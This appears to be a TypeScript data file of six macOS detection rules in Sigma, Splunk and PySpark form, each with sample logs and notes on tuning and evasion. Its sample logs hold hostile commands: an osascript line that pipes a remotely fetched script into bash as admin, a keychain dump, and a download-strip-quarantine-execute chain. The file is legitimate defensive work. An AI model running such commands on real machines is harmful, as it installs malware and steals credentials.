import type { Detection } from "./types";

export const macosDetections: Detection[] = [
  {
    id: "det-macos-001",
    title: "Unmanaged LaunchAgent/LaunchDaemon Plist Creation",
    description:
      "Detects creation or modification of property list files in LaunchAgent/LaunchDaemon directories by a process other than a known MDM, package installer, or Apple system process -- the dominant macOS persistence mechanism.",
    platform: ["macOS", "Endpoint"],
    mitre: ["T1543.001", "T1547.001"],
    category: "Persistence",
    maturity: "experimental",
    severity: "high",
    tags: ["macos", "persistence", "launchd", "plist"],
    author: "Detection Engineering Team",
    updated: "2026-10-29",
    sigma: `title: Unmanaged LaunchAgent or LaunchDaemon Plist Creation
id: det-macos-001
status: experimental
description: Detects new or modified plist files in LaunchAgent/LaunchDaemon paths written by a process that isn't a known installer or MDM agent.
references:
  - https://attack.mitre.org/techniques/T1543/001/
  - https://attack.mitre.org/techniques/T1547/001/
author: Detection Engineering Team
date: 2026/10/29
tags:
  - attack.persistence
  - attack.privilege_escalation
  - attack.t1543.001
  - attack.t1547.001
logsource:
  category: file_event
  product: macos
detection:
  selection:
    TargetFilename|contains:
      - '/Library/LaunchAgents/'
      - '/Library/LaunchDaemons/'
    TargetFilename|endswith: '.plist'
  filter_known_installers:
    Image|contains:
      - '/usr/sbin/installer'
      - '/usr/libexec/mdmclient'
      - '/System/Library/'
  condition: selection and not filter_known_installers
falsepositives:
  - Legitimate software installers registering startup items
  - MDM-managed configuration profile deployment
level: high`,
    splunk: `index=endpoint sourcetype="macos:fsevents" OR sourcetype="macos:unified_log"
  (TargetFilename="*/Library/LaunchAgents/*.plist" OR TargetFilename="*/Library/LaunchDaemons/*.plist")
NOT (Image="/usr/sbin/installer" OR Image="/usr/libexec/mdmclient" OR Image="/System/Library/*")
| table _time, host, user, Image, TargetFilename
| sort -_time`,
    pyspark: `from pyspark.sql import SparkSession
from pyspark.sql.functions import col, lower

spark = SparkSession.builder.appName("MacLaunchdPersistence").getOrCreate()

df = spark.read.parquet("s3://security-lake/endpoint/macos/file_events/")

detections = df.filter(
    (lower(col("target_filename")).contains("/library/launchagents/")) |
    (lower(col("target_filename")).contains("/library/launchdaemons/"))
).filter(
    lower(col("target_filename")).endswith(".plist")
).filter(
    ~lower(col("image")).startswith("/usr/sbin/installer") &
    ~lower(col("image")).startswith("/usr/libexec/mdmclient") &
    ~lower(col("image")).startswith("/system/library/")
).select("timestamp", "host", "user", "image", "target_filename")

detections.write.mode("append").parquet("s3://detections/output/")`,
    sampleLogs: [
      `{"event":"fsevent.create","timestamp":"2026-10-29T09:12:04Z","host":"MACBOOK-A1","user":"jdoe","image":"/private/tmp/update.sh","target_filename":"/Users/jdoe/Library/LaunchAgents/com.apple.sysupdate.plist"}`,
      `{"event":"fsevent.create","timestamp":"2026-10-29T09:12:06Z","host":"MACBOOK-A1","user":"root","image":"/bin/bash","target_filename":"/Library/LaunchDaemons/com.apple.networkhelper.plist"}`,
    ],
    requiredFields: [
      "file.path / TargetFilename",
      "process.image / Image",
      "user.name",
      "host.name",
      "event.timestamp",
    ],
    falsePositives: [
      "Legitimate installer packages (.pkg) registering startup agents",
      "MDM profile deployment (Jamf, Kandji, Mosyle) pushing configuration",
      "Developer tools (Homebrew services, Docker Desktop) registering helper daemons",
    ],
    tuningGuidance:
      "Baseline your fleet's MDM and known software deployment tool hashes/paths and suppress them explicitly rather than broadly excluding all of /System/Library. Flag plist labels that impersonate Apple naming conventions (com.apple.*) but are not code-signed by Apple.",
    deploymentNotes:
      "Requires an EDR with macOS FSEvents or Endpoint Security Framework (ESF) file-write visibility -- native macOS unified logging alone does not reliably capture third-party file writes outside sandboxed apps.",
    evasionConsiderations:
      "Attackers may write the plist via a signed, trusted binary (e.g. osascript or a LOLBin) to blend into the filter, or stage the file with a delayed load via launchctl bootstrap executed separately from the write. Correlate plist creation with a subsequent launchctl load/bootstrap event for higher-confidence alerting.",
    problemStatement:
      "LaunchAgents and LaunchDaemons are the most common persistence mechanism across macOS malware families because they are simple, well-documented, and survive reboots. Nearly every commodity macOS stealer and most targeted intrusions register at least one plist, making this directory pair the single highest-value monitoring point on the platform.",
  },
  {
    id: "det-macos-002",
    title: "TCC Database Direct Manipulation",
    description:
      "Detects writes to the TCC (Transparency, Consent, and Control) permissions database by a process other than tccd itself, indicating an attempt to self-grant privacy permissions (camera, microphone, full disk access, accessibility) without user consent.",
    platform: ["macOS", "Endpoint"],
    mitre: ["T1222", "T1548"],
    category: "Defense Evasion",
    maturity: "experimental",
    severity: "critical",
    tags: ["macos", "tcc", "defense-evasion", "privacy-bypass"],
    author: "Detection Engineering Team",
    updated: "2026-10-29",
    sigma: `title: TCC Database Direct Manipulation
id: det-macos-002
status: experimental
description: Detects a process other than tccd writing to TCC.db, indicating an attempt to self-grant privacy permissions.
references:
  - https://attack.mitre.org/techniques/T1222/
author: Detection Engineering Team
date: 2026/10/29
tags:
  - attack.defense_evasion
  - attack.privilege_escalation
  - attack.t1222
logsource:
  category: file_event
  product: macos
detection:
  selection:
    TargetFilename|endswith:
      - '/Library/Application Support/com.apple.TCC/TCC.db'
      - '/Library/Application Support/com.apple.TCC/TCC.db-wal'
  filter_tccd:
    Image: '/System/Library/PrivateFrameworks/TCC.framework/Support/tccd'
  condition: selection and not filter_tccd
falsepositives:
  - System Integrity Protection exempted backup/migration tools (rare, should still be reviewed)
level: critical`,
    splunk: `index=endpoint sourcetype="macos:fsevents"
  TargetFilename="*com.apple.TCC/TCC.db*"
NOT Image="/System/Library/PrivateFrameworks/TCC.framework/Support/tccd"
| table _time, host, user, Image, TargetFilename
| sort -_time`,
    pyspark: `from pyspark.sql import SparkSession
from pyspark.sql.functions import col, lower

spark = SparkSession.builder.appName("MacTCCManipulation").getOrCreate()

df = spark.read.parquet("s3://security-lake/endpoint/macos/file_events/")

detections = df.filter(
    lower(col("target_filename")).contains("com.apple.tcc/tcc.db")
).filter(
    ~lower(col("image")).contains("/tcc.framework/support/tccd")
).select("timestamp", "host", "user", "image", "target_filename")

detections.write.mode("append").parquet("s3://detections/output/")`,
    sampleLogs: [
      `{"event":"fsevent.write","timestamp":"2026-10-29T11:02:51Z","host":"MACBOOK-A1","user":"jdoe","image":"/usr/bin/sqlite3","target_filename":"/Users/jdoe/Library/Application Support/com.apple.TCC/TCC.db"}`,
    ],
    requiredFields: [
      "file.path / TargetFilename",
      "process.image / Image",
      "user.name",
      "host.name",
      "event.timestamp",
    ],
    falsePositives: [
      "Full-disk-access backup/migration utilities explicitly entitled to modify TCC (very rare, allowlist by signed bundle ID)",
    ],
    tuningGuidance:
      "This should be a near-zero-false-positive, high-urgency alert when System Integrity Protection is enabled. If SIP is disabled on the host, treat the disablement itself as a separate critical finding, since it is a prerequisite for this technique.",
    deploymentNotes:
      "Requires Endpoint Security Framework (ESF) file-write events or an EDR agent with FDA (Full Disk Access) entitlement, since TCC.db itself lives in an SIP-protected, TCC-gated location.",
    evasionConsiderations:
      "With SIP disabled, attackers write directly to TCC.db via sqlite3 or a custom binary. Some malware instead uses AppleScript/osascript to drive System Settings UI and click through consent dialogs programmatically -- correlate with unusual Accessibility API usage from scripting runtimes as a secondary signal.",
    problemStatement:
      "TCC manipulation lets malware grant itself camera, microphone, screen recording, or Full Disk Access without ever showing the user a consent prompt, defeating macOS's core privacy control model. Multiple 2026 in-the-wild AppleScript droppers have been observed self-granting Accessibility permissions this way.",
  },
  {
    id: "det-macos-003",
    title: "osascript Privilege Escalation and Keychain Access",
    description:
      "Detects osascript/JXA invoking 'do shell script ... with administrator privileges' (graphical sudo prompt abuse) or directly invoking the security CLI to dump keychain contents -- both common in AppleScript-based stealers.",
    platform: ["macOS", "Endpoint"],
    mitre: ["T1555.001", "T1548.004"],
    category: "Credential Access",
    maturity: "experimental",
    severity: "high",
    tags: ["macos", "osascript", "keychain", "credential-access"],
    author: "Detection Engineering Team",
    updated: "2026-10-29",
    sigma: `title: osascript Privilege Escalation or Keychain Dump
id: det-macos-003
status: experimental
description: Detects osascript invoking administrator-privileged shell commands or security CLI keychain dumps.
references:
  - https://attack.mitre.org/techniques/T1555/001/
author: Detection Engineering Team
date: 2026/10/29
tags:
  - attack.credential_access
  - attack.privilege_escalation
  - attack.t1555.001
  - attack.t1548.004
logsource:
  category: process_creation
  product: macos
detection:
  selection_osascript:
    Image|endswith: '/osascript'
    CommandLine|contains: 'with administrator privileges'
  selection_keychain:
    CommandLine|contains:
      - 'security find-generic-password'
      - 'security dump-keychain'
      - 'security find-internet-password'
  condition: selection_osascript or selection_keychain
falsepositives:
  - IT helpdesk automation scripts prompting for admin approval
  - Developer tooling reading its own app-specific keychain item
level: high`,
    splunk: `index=endpoint sourcetype="macos:unified_log" EventType=process_creation
  (Image="*/osascript" CommandLine="*with administrator privileges*")
  OR (CommandLine="*security find-generic-password*" OR CommandLine="*security dump-keychain*" OR CommandLine="*security find-internet-password*")
| table _time, host, user, Image, CommandLine, ParentImage
| sort -_time`,
    pyspark: `from pyspark.sql import SparkSession
from pyspark.sql.functions import col, lower

spark = SparkSession.builder.appName("MacOsascriptKeychain").getOrCreate()

df = spark.read.parquet("s3://security-lake/endpoint/macos/process_creation/")

osascript_priv = (
    lower(col("image")).endswith("/osascript") &
    lower(col("command_line")).contains("with administrator privileges")
)
keychain_dump = lower(col("command_line")).rlike(
    "security (find-generic-password|dump-keychain|find-internet-password)"
)

detections = df.filter(osascript_priv | keychain_dump).select(
    "timestamp", "host", "user", "image", "command_line", "parent_image"
)

detections.write.mode("append").parquet("s3://detections/output/")`,
    sampleLogs: [
      `{"event":"process.exec","timestamp":"2026-10-29T13:40:11Z","host":"MACBOOK-B2","user":"asmith","image":"/usr/bin/osascript","command_line":"osascript -e 'do shell script \\"curl -s http://185.x.x.x/p2 | bash\\" with administrator privileges'","parent_image":"/bin/bash"}`,
      `{"event":"process.exec","timestamp":"2026-10-29T13:41:02Z","host":"MACBOOK-B2","user":"asmith","image":"/usr/bin/security","command_line":"security dump-keychain -d login.keychain-db","parent_image":"/usr/bin/osascript"}`,
    ],
    requiredFields: [
      "process.image / Image",
      "process.command_line / CommandLine",
      "process.parent.image / ParentImage",
      "user.name",
      "host.name",
    ],
    falsePositives: [
      "Legitimate admin automation scripts used by IT (baseline known script hashes)",
      "Password manager CLI integrations reading their own entries",
    ],
    tuningGuidance:
      "Alert at high severity when osascript's admin-privilege shell-out is immediately followed (within 60s, same host/user) by a network connection or a security keychain command -- this chain is a strong indicator of an AppleScript-based credential stealer rather than legitimate IT tooling.",
    deploymentNotes:
      "Requires process command-line auditing on macOS, available via EDR or the Endpoint Security Framework's ES_EVENT_TYPE_NOTIFY_EXEC event with argv capture.",
    evasionConsiderations:
      "Attackers may split the administrator-privilege prompt and the keychain access into separate, delayed script invocations to break correlation windows, or route through a compiled .app bundle instead of raw osascript to avoid LOLBin-style monitoring. Monitor signed-but-newly-notarized apps requesting Keychain access shortly after first execution as a secondary signal.",
    problemStatement:
      "AppleScript/JXA give attackers a scripting runtime with legitimate access to System Events, admin-privilege prompts, and the security CLI -- 2026 campaigns (including Atomic-Stealer-style droppers) use exactly this combination to harvest browser and system credentials without dropping a compiled binary that EDR static analysis would flag.",
  },
  {
    id: "det-macos-004",
    title: "DYLD_INSERT_LIBRARIES Dynamic Library Injection",
    description:
      "Detects processes launched with the DYLD_INSERT_LIBRARIES environment variable set to a non-standard path, a long-standing macOS code injection technique used to hook into trusted, often signed, processes.",
    platform: ["macOS", "Endpoint"],
    mitre: ["T1574.006", "T1055"],
    category: "Defense Evasion",
    maturity: "experimental",
    severity: "high",
    tags: ["macos", "dylib-hijack", "injection", "defense-evasion"],
    author: "Detection Engineering Team",
    updated: "2026-10-29",
    sigma: `title: DYLD_INSERT_LIBRARIES Code Injection
id: det-macos-004
status: experimental
description: Detects process launches with DYLD_INSERT_LIBRARIES set to a path outside standard framework locations.
references:
  - https://attack.mitre.org/techniques/T1574/006/
author: Detection Engineering Team
date: 2026/10/29
tags:
  - attack.defense_evasion
  - attack.persistence
  - attack.t1574.006
logsource:
  category: process_creation
  product: macos
detection:
  selection:
    EnvironmentVariables|contains: 'DYLD_INSERT_LIBRARIES='
  filter_standard:
    EnvironmentVariables|contains:
      - 'DYLD_INSERT_LIBRARIES=/System/Library/'
      - 'DYLD_INSERT_LIBRARIES=/usr/lib/'
  condition: selection and not filter_standard
falsepositives:
  - Legitimate debugging/profiling tools (Instruments, LLDB-based tooling)
  - Some antivirus/EDR agents use dylib injection for self-protection hooks
level: high`,
    splunk: `index=endpoint sourcetype="macos:unified_log" EventType=process_creation
  EnvironmentVariables="*DYLD_INSERT_LIBRARIES=*"
NOT (EnvironmentVariables="*DYLD_INSERT_LIBRARIES=/System/Library/*" OR EnvironmentVariables="*DYLD_INSERT_LIBRARIES=/usr/lib/*")
| table _time, host, user, Image, EnvironmentVariables, ParentImage
| sort -_time`,
    pyspark: `from pyspark.sql import SparkSession
from pyspark.sql.functions import col, lower

spark = SparkSession.builder.appName("MacDyldInjection").getOrCreate()

df = spark.read.parquet("s3://security-lake/endpoint/macos/process_creation/")

detections = df.filter(
    lower(col("environment_variables")).contains("dyld_insert_libraries=")
).filter(
    ~lower(col("environment_variables")).contains("dyld_insert_libraries=/system/library/") &
    ~lower(col("environment_variables")).contains("dyld_insert_libraries=/usr/lib/")
).select("timestamp", "host", "user", "image", "environment_variables", "parent_image")

detections.write.mode("append").parquet("s3://detections/output/")`,
    sampleLogs: [
      `{"event":"process.exec","timestamp":"2026-10-29T15:20:33Z","host":"MACBOOK-C3","user":"rlee","image":"/Applications/Slack.app/Contents/MacOS/Slack","environment_variables":"DYLD_INSERT_LIBRARIES=/private/tmp/.cache/libhook.dylib","parent_image":"/bin/zsh"}`,
    ],
    requiredFields: [
      "process.image / Image",
      "process.env_vars / EnvironmentVariables",
      "process.parent.image / ParentImage",
      "user.name",
      "host.name",
    ],
    falsePositives: [
      "Developer profiling/debugging workflows (Xcode Instruments)",
      "Some legitimate EDR/AV products inject their own monitoring dylibs",
    ],
    tuningGuidance:
      "Allowlist known EDR/AV self-protection dylib paths explicitly (by code-signature, not just path). Prioritize alerts where the injected dylib path is in a world-writable or hidden directory (dotfile directories, /tmp, /private/tmp).",
    deploymentNotes:
      "Requires environment-variable capture at process creation, which most consumer EDRs support on macOS via ESF's ES_EVENT_TYPE_NOTIFY_EXEC audit token. Note that hardened-runtime apps (most notarized App Store and many direct-download apps) reject DYLD_INSERT_LIBRARIES outright, which somewhat limits -- but does not eliminate -- this vector against modern targets.",
    evasionConsiderations:
      "Attackers targeting hardened-runtime binaries pivot to other injection primitives (task_for_pid-based injection, XPC hijacking) that this rule does not cover. Treat this as one layer of a broader injection-detection strategy, not a complete one.",
    problemStatement:
      "DYLD_INSERT_LIBRARIES remains a reliable injection technique against any process that hasn't opted into the hardened runtime, letting malware execute inside the address space of a trusted, often network-connected application to blend outbound traffic and evade process-based allowlisting.",
  },
  {
    id: "det-macos-005",
    title: "Quarantine-Bypass Dropper Pattern (curl | chmod | execute)",
    description:
      "Detects the classic macOS infostealer dropper chain: downloading an executable with curl, clearing the com.apple.quarantine extended attribute to bypass Gatekeeper, making it executable, and running it -- the pattern used by Atomic Stealer and similar commodity malware delivered via fake software/cracked-app sites.",
    platform: ["macOS", "Endpoint"],
    mitre: ["T1553.001", "T1105"],
    category: "Initial Access",
    maturity: "experimental",
    severity: "critical",
    tags: ["macos", "gatekeeper-bypass", "quarantine", "dropper", "atomic-stealer"],
    author: "Detection Engineering Team",
    updated: "2026-10-29",
    sigma: `title: Quarantine-Bypass Dropper Chain
id: det-macos-005
status: experimental
description: Detects a shell sequence downloading a file, clearing its quarantine attribute, and executing it within a short window.
references:
  - https://attack.mitre.org/techniques/T1553/001/
author: Detection Engineering Team
date: 2026/10/29
tags:
  - attack.defense_evasion
  - attack.initial_access
  - attack.t1553.001
logsource:
  category: process_creation
  product: macos
detection:
  selection_download:
    Image|endswith:
      - '/curl'
      - '/wget'
  selection_quarantine_clear:
    CommandLine|contains: 'xattr -d com.apple.quarantine'
  selection_chmod_exec:
    CommandLine|contains: 'chmod +x'
  condition: selection_download and selection_quarantine_clear and selection_chmod_exec
falsepositives:
  - Developers manually clearing quarantine on self-built or trusted unsigned tools
level: critical`,
    splunk: `index=endpoint sourcetype="macos:unified_log" EventType=process_creation
  (Image="*/curl" OR Image="*/wget")
| eval host_user=host+":"+user
| stats values(CommandLine) as commands by host_user _time
| search commands="*xattr -d com.apple.quarantine*" commands="*chmod +x*"
| table _time, host_user, commands`,
    pyspark: `from pyspark.sql import SparkSession
from pyspark.sql.functions import col, lower, window, collect_list

spark = SparkSession.builder.appName("MacQuarantineBypassDropper").getOrCreate()

df = spark.read.parquet("s3://security-lake/endpoint/macos/process_creation/")

# Correlate download + quarantine-clear + chmod within a 5-minute window per host/user
windowed = df.groupBy(
    "host", "user", window(col("timestamp"), "5 minutes")
).agg(collect_list("command_line").alias("commands"))

def has_dropper_chain(commands):
    joined = " ".join(commands).lower()
    return ("curl" in joined or "wget" in joined) and "xattr -d com.apple.quarantine" in joined and "chmod +x" in joined

detections = windowed.rdd.filter(lambda r: has_dropper_chain(r["commands"])).toDF()
detections.write.mode("append").parquet("s3://detections/output/")`,
    sampleLogs: [
      `{"event":"process.exec","timestamp":"2026-10-29T18:05:01Z","host":"MACBOOK-D4","user":"ksmith","image":"/usr/bin/curl","command_line":"curl -o /tmp/Installer.dmg https://macos-update-pkg[.]net/Installer.dmg"}`,
      `{"event":"process.exec","timestamp":"2026-10-29T18:05:22Z","host":"MACBOOK-D4","user":"ksmith","image":"/usr/bin/xattr","command_line":"xattr -d com.apple.quarantine /tmp/Installer.app"}`,
      `{"event":"process.exec","timestamp":"2026-10-29T18:05:25Z","host":"MACBOOK-D4","user":"ksmith","image":"/bin/chmod","command_line":"chmod +x /tmp/Installer.app/Contents/MacOS/Installer"}`,
    ],
    requiredFields: [
      "process.image / Image",
      "process.command_line / CommandLine",
      "user.name",
      "host.name",
      "event.timestamp",
    ],
    falsePositives: [
      "Developers clearing quarantine on self-compiled or internally-distributed unsigned tools",
      "Homebrew casks that legitimately clear quarantine as part of install (baseline brew's own process tree)",
    ],
    tuningGuidance:
      "Correlate all three steps within a short time window (5 minutes is a reasonable default) and same host/user rather than alerting on any single step in isolation, since curl and chmod individually are far too common to alert on alone. Exclude known package manager process trees (Homebrew, MacPorts).",
    deploymentNotes:
      "Requires process command-line logging plus either session-based correlation in the SIEM or a streaming correlation engine; this is a sequence detection, not a single-event rule, so single-log-line sigma backends will need the stats-based Splunk variant shown here rather than a literal line-for-line translation.",
    evasionConsiderations:
      "Attackers can replace curl/wget with osascript-driven downloads, a compiled downloader stage, or Finder-driven manual extraction by the victim (social-engineered DMG double-click) that never touches a shell at all -- this rule only catches the scripted variant. Pair with Gatekeeper/XProtect event log monitoring for the GUI-driven path.",
    problemStatement:
      "This exact three-step chain -- download, strip quarantine, execute -- is the delivery mechanism behind most 2026 macOS commodity stealers distributed via fake cracked-software and \"update your browser\" sites, because it reliably defeats Gatekeeper without needing a valid Developer ID signature.",
  },
  {
    id: "det-macos-006",
    title: "Shell Profile and Login Item Persistence",
    description:
      "Detects modifications to shell startup files (~/.zshrc, ~/.bash_profile, ~/.zprofile) or additions to the Login Items / com.apple.loginitems list by processes other than the user's interactive shell or System Settings, a lightweight persistence technique that survives reboot without needing launchd.",
    platform: ["macOS", "Endpoint"],
    mitre: ["T1546.004", "T1547.015"],
    category: "Persistence",
    maturity: "experimental",
    severity: "medium",
    tags: ["macos", "persistence", "shell-profile", "login-items"],
    author: "Detection Engineering Team",
    updated: "2026-10-29",
    sigma: `title: Shell Profile or Login Item Persistence
id: det-macos-006
status: experimental
description: Detects non-interactive writes to shell profile files or Login Items plist, commonly used for lightweight macOS persistence.
references:
  - https://attack.mitre.org/techniques/T1546/004/
  - https://attack.mitre.org/techniques/T1547/015/
author: Detection Engineering Team
date: 2026/10/29
tags:
  - attack.persistence
  - attack.t1546.004
  - attack.t1547.015
logsource:
  category: file_event
  product: macos
detection:
  selection_profile:
    TargetFilename|endswith:
      - '/.zshrc'
      - '/.bash_profile'
      - '/.zprofile'
      - '/.zshenv'
  selection_loginitems:
    TargetFilename|contains: 'com.apple.loginitems'
  filter_interactive:
    Image|endswith:
      - '/zsh'
      - '/bash'
      - '/System Settings'
      - '/System Preferences'
  condition: (selection_profile or selection_loginitems) and not filter_interactive
falsepositives:
  - Dotfile managers (chezmoi, stow) run from automation
  - Package managers appending PATH exports (Homebrew, nvm, pyenv, rbenv installers)
level: medium`,
    splunk: `index=endpoint sourcetype="macos:fsevents"
  (TargetFilename="*/.zshrc" OR TargetFilename="*/.bash_profile" OR TargetFilename="*/.zprofile" OR TargetFilename="*/.zshenv" OR TargetFilename="*com.apple.loginitems*")
NOT (Image="*/zsh" OR Image="*/bash" OR Image="*System Settings*" OR Image="*System Preferences*")
| table _time, host, user, Image, TargetFilename
| sort -_time`,
    pyspark: `from pyspark.sql import SparkSession
from pyspark.sql.functions import col, lower

spark = SparkSession.builder.appName("MacShellProfilePersistence").getOrCreate()

df = spark.read.parquet("s3://security-lake/endpoint/macos/file_events/")

profile_paths = ["/.zshrc", "/.bash_profile", "/.zprofile", "/.zshenv"]
is_profile = col("target_filename").rlike("|".join([p.replace(".", "\\\\.") for p in profile_paths]))
is_loginitems = lower(col("target_filename")).contains("com.apple.loginitems")

detections = df.filter(is_profile | is_loginitems).filter(
    ~lower(col("image")).endswith("/zsh") &
    ~lower(col("image")).endswith("/bash") &
    ~lower(col("image")).contains("system settings") &
    ~lower(col("image")).contains("system preferences")
).select("timestamp", "host", "user", "image", "target_filename")

detections.write.mode("append").parquet("s3://detections/output/")`,
    sampleLogs: [
      `{"event":"fsevent.write","timestamp":"2026-10-29T19:30:12Z","host":"MACBOOK-E5","user":"tchen","image":"/usr/bin/python3","target_filename":"/Users/tchen/.zshrc"}`,
    ],
    requiredFields: [
      "file.path / TargetFilename",
      "process.image / Image",
      "user.name",
      "host.name",
      "event.timestamp",
    ],
    falsePositives: [
      "Dotfile management tooling (chezmoi, GNU stow) run outside an interactive shell",
      "Language version manager installers (nvm, pyenv, rbenv) appending PATH/init lines",
      "IDE or terminal app first-run setup wizards",
    ],
    tuningGuidance:
      "Lower-signal than launchd persistence, so keep severity at medium and focus on volume/novelty: alert when the writing process has no prior history on the host, or when the appended line references a network location (curl, nc, base64 -d) rather than a simple PATH export.",
    deploymentNotes:
      "Same FSEvents/ESF requirement as the LaunchAgent rule (det-macos-001); these two rules share a collection pipeline and are commonly deployed together.",
    evasionConsiderations:
      "Attackers can append an innocuous-looking one-liner (e.g. a short curl-pipe) that blends with legitimate PATH exports; diff-based content inspection of the appended lines, not just the fact of modification, meaningfully improves precision here.",
    problemStatement:
      "Shell profile persistence is low-effort and launchd-free, making it attractive for lightweight implants that want to survive reboot without registering a plist that EDR vendors have spent years tuning detections for.",
  },
];
